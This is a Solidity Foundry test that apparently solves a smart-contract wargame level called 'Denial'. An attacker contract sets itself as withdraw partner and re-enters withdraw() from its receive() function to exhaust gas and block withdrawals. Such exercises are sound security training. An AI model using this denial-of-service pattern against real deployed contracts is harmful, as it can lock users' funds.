// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IDenial {
  function setWithdrawPartner(address) external;
  function withdraw() external;
}

contract DenialAttack {
  IDenial internal challenge;

  constructor(address _challengeAddress) {
    challenge = IDenial(_challengeAddress);
  }

  function attack() public {
    challenge.setWithdrawPartner(address(this));
  }

  receive() external payable {
    challenge.withdraw();
  }
}

contract DenialTest is Test {
  address internal challengeAddress;
  DenialAttack internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xf1D573178225513eDAA795bE9206f7E311EeDEc3, 0.001 ether);
    attackContract = new DenialAttack(challengeAddress);
  }

  function testExploit() public {
    attackContract.attack();

    utils.submitLevelInstance(challengeAddress);
  }
}
